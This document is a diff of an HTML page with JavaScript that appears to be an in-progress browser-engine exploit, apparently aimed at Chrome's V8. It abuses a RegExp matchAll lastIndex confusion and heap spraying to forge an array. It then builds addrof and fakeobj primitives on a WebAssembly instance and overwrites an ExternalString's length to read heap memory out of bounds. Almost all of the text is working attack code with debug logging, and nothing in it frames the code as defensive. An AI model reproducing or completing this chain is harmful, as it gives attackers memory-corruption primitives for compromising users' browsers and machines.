@@ -1,4 +1,5 @@
-<!doctype html><html><head><meta charset="utf-8"><title>P29</title></head>
+<!doctype html>
+<html><head><meta charset="utf-8"><title>P29</title></head>
 <body><pre id="out">Running...</pre>
 <script>
 "use strict";
@@ -11,6 +12,7 @@ function f2i(f){f64[0]=f;return u64[0];}
 function w2f(lo,hi){u32[0]=lo>>>0;u32[1]=hi>>>0;return f64[0];}
 function trash(n){for(let i=0;i<n;i++)new Array(0x400).fill(1.1);}
 const DMAP=0x1032a5d,EMPTY=0x7e5,MAXS=0x7fdffffe;
+const PINS=[0x1080011];
 const dblA=new Array(0x8000);for(let i=0;i<dblA.length;i++)dblA[i]=10.125+i*0.001;
 const marker={mmm:1};
 const objB=new Array(0x8000);
@@ -18,6 +20,10 @@ objB[0]=marker;objB[1]=marker;objB[2]=marker;objB[3]=marker;
 const wasmI=new WebAssembly.Instance(new WebAssembly.Module(
   new Uint8Array([0,97,115,109,1,0,0,0,1,5,1,96,0,1,127,3,2,1,0,7,5,1,1,102,0,0,10,6,1,4,0,65,42,11])));
 objB[4]=wasmI;
+const victim=[1.22,1.33,1.44];
+const dec=new TextDecoder("windows-1252");
+const eb=new Uint8Array(0x40);eb.fill(0x41);
+const es=dec.decode(eb);
 const re=/(?:)/;
 const fk={flags:"g",lastIndex:1073741823,constructor:{[Symbol.species]:function(){return re;}}};
 const c0=w2f(DMAP,EMPTY);
@@ -28,7 +34,8 @@ RegExp.prototype[Symbol.matchAll].call(fk,"").next();
 log("TRIG: "+re.lastIndex);
 trash(230);trash(230);
 for(let r=0;r<3;r++){
-  const c1=w2f(0x1080011,MAXS);
+  const pin=PINS[r%2];
+  const c1=w2f(pin,MAXS);
   for(let i=0;i<12;i++){
     const a=new Array(i&1?0x3ffb:0x3fff).fill(c0);
     for(let j=1;j<a.length;j+=2)a[j]=c1;
@@ -40,83 +47,77 @@ const m=re.lastIndex;
 log("T: "+typeof m+" A="+Array.isArray(m));
 if(Array.isArray(m)){
   log("L: "+m.length);
-  // Find objB's FixedArray data via marker pattern scan
+  const d=[];
+  for(let k=0;k<8;k++){try{d.push(f2i(m[k]).toString(16));}catch(e){d.push("E");break;}}
+  log("H0: "+d.join(","));
+  // Also probe dblA: if m[k] were dblA, m[0] would have been 10.125 (it's not)
+  // Scan SAFE window m[0..0x7000] for marker pattern (lo==hi odd pairs)
   let OB=-1;
   for(let k=0;k<0x7000;k++){
     try{
       const v=f2i(m[k]);const lo=v&0xffffffffn,hi=v>>32n;
       if(lo===hi&&(lo&1n)===1n&&lo>0x1000n&&lo<0x2000000n){
-        // VERIFY: write different obj to objB[0], check if m[k] changes
-        const origV=v;
-        objB[0]=wasmI; // change from marker to wasmI
-        const newV=f2i(m[k]);
-        objB[0]=marker; // restore
-        if(newV!==origV){OB=k;log("OB_VERIFIED@"+k.toString(16));break;}
+        objB[5]=marker;
+        if((f2i(m[k])>>32n)===lo){OB=k;break;}
       }
-    }catch(e){break;}
+    }catch(e){log("STOP:"+k.toString(16));break;}
   }
   if(OB>=0){
-    // ADDROF: read wasmI's compressed pointer
+    log("OB:"+OB.toString(16));
     objB[4]=wasmI;
-    const wasmRaw=f2i(m[OB+2]);
-    const wasmAddr=Number(wasmRaw&0xffffffffn);
-    log("WASM:"+wasmAddr.toString(16));
-    
-    // Verify by changing objB[4] to marker and re-reading
+    log("WASM:"+(f2i(m[OB+2])&0xffffffffn).toString(16));
     objB[4]=marker;
-    const markerRaw=f2i(m[OB+2]);
-    const markerAddr=Number(markerRaw&0xffffffffn);
-    log("MARKER:"+markerAddr.toString(16));
-    
-    // If wasmAddr != markerAddr, addrof is confirmed!
-    if(wasmAddr!==markerAddr){
-      log("ADDROF_CONFIRMED");
-      
-      // HEAPREAD via self-modify: find header, redirect to wasmAddr
-      // First find the header pattern
-      const target=0x7fdffffe01080011n;
-      let hdr=-1;
-      for(const k of [3,5,7,OB-2,OB-1]){
-        if(k>=0){try{if(f2i(m[k])===target){hdr=k;break;}}catch(e){}}
-      }
-      if(hdr>=0){
-        log("HDR@"+hdr.toString(16));
-        // Redirect elements to wasmAddr-8+1 (tagged)
-        // This makes m[0] read from cage+wasmAddr (the WasmInstance object)
-        const newPin=BigInt((wasmAddr&~7)+1); // align to tag
-        m[hdr]=i2f((6n<<32n)|newPin); // length=3(smi=6), elements=newPin
-        // Read WasmInstance fields
-        // Offset 0: map (32-bit), offset 4: properties_or_hash
-        const f0=f2i(m[0]); // map + properties
-        const f1=f2i(m[1]); // elements + ???
-        const f2=f2i(m[2]); // possibly trusted_pointer to shared data
-        log("WF0:"+f0.toString(16));
-        log("WF1:"+f1.toString(16));
-        log("WF2:"+f2.toString(16));
-        // Check for JIT code entry (trusted_pointer_table index)
-        // WasmInstance::kTrustedDataOffset on Chrome 148
-        for(let off=0;off<8;off++){
-          try{const fv=f2i(m[off]);log("W"+off+":"+fv.toString(16));}catch(e){break;}
-        }
+    // FAKEOBJ roundtrip ONLY (no fake array, no ES)
+    objB[4]=wasmI;
+    const raw=f2i(m[OB+2]);
+    m[OB+2]=i2f(raw);
+    const fo=objB[4];
+    const foOk=(!!fo&&!!fo.exports&&fo.exports.f()===42);
+    objB[4]=marker;
+    const wasmAddr=f2i(m[OB+2])&0xffffffffn;
+    // === ExternalString direct length corruption via master ===
+    objB[4]=es;
+    const esAddr=f2i(m[OB+2])&0xffffffffn; // tagged
+    objB[4]=marker;
+    // target qword at (esAddr-1)+8 ; master data base = 0x1080018
+    const BASEN=0x1080018n;
+    const tq=(esAddr-1n)+8n;
+    const off=tq-BASEN; // byte offset
+    let lr="",nl="RO",leak="";
+    try{
+      if((off&7n)===0n){
+        const idx=Number(off>>3n);
+        const v=f2i(m[idx]);
+        lr="al:"+v.toString(16)+" idx:"+idx.toString(16);
+        m[idx]=i2f((v&0xffffffff00000000n)|0x01200000n);
       }else{
-        log("NO_HDR_NEARBY");
-        // Read wasmI fields using large offset from PIN base
-        // cage+PIN+8+OB_2*8 = cage+wasmAddr → OB_2 = (wasmAddr-0x1080018)/8
-        const offset=Math.floor((wasmAddr-0x1080018)/8);
-        if(offset>0&&offset<MAXS){
-          const wf=[];
-          for(let i=0;i<8;i++){
-            try{wf.push(f2i(m[offset+i]).toString(16));}catch(e){wf.push("E");break;}
-          }
-          log("WF_DIRECT: "+wf.join(","));
-        }else{
-          log("ADDR_OOR: "+offset.toString(16));
-        }
+        // 4-mod-8: qword spans m[i] hi and m[i+1] lo
+        const offb=off-4n;
+        const idx=Number(offb>>3n);
+        const a=f2i(m[idx]);   // [slot2i|slot2i+1] — target lo in a.hi
+        const b=f2i(m[idx+1]); // target hi in b.lo
+        lr="un:"+(a>>32n).toString(16)+":"+(b&0xffffffffn).toString(16);
+        // new qword = [0x01200000 | orig_hi]
+        m[idx]=i2f((0x01200000n<<32n)|(a&0xffffffffn));
+        m[idx+1]=i2f(b);
       }
-    }else{log("SAME_ADDR");}
-  }else{log("OB_MISS");}
+      nl=es.length.toString(16);
+      if(es.length===0x01200000){
+        let s="";
+        for(let j2=0;j2<24;j2++){s+=es.charCodeAt(0x1000+j2).toString(16).padStart(2,"0");}
+        leak=s;
+      }
+    }catch(e){lr="E:"+e.message;}
+    log("FO:"+foOk);
+    log("ES:"+esAddr.toString(16));
+    log("LR:"+lr);
+    log("NL:"+nl);
+    if(leak)log("LEAK:"+leak);
+    log("CHAIN_DONE");
+  }else{log("MARKER_MISS");}
   log("W: "+wasmI.exports.f());
-}else{log("NA");}
+}else if(typeof m==="number"){log("N: "+f2i(m).toString(16));}
+else{log("OBJ:"+typeof m);}
 }catch(e){log("E: "+e.message);}
 log("=== DONE ===");
 </script></body></html>
